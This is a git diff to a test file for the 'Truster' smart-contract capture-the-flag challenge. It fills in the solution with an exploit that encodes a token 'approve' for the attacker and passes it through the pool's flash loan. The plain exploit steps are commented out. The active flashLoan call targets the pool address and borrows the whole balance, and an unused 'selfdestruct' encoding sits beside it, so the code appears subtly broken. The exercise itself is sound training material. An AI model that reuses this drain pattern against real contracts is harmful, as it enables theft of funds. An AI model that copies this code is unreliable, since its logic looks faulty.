@@ -22,7 +22,18 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /** CODE YOUR EXPLOIT HERE  */
+        const callData = this.token.interface.encodeFunctionData("approve", [
+                attacker.address,
+                TOKENS_IN_POOL,
+        ]);
+        //await this.pool.flashLoan(0, attacker.address, this.token.address, callData);
+        //await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
+        const callData2 = this.pool.interface.encodeFunctionData("selfdestruct", [
+                attacker.address,
+        ]);
+        await this.pool.flashLoan(TOKENS_IN_POOL, attacker.address, this.pool.address, callData);
+
     });
 
     after(async function () {
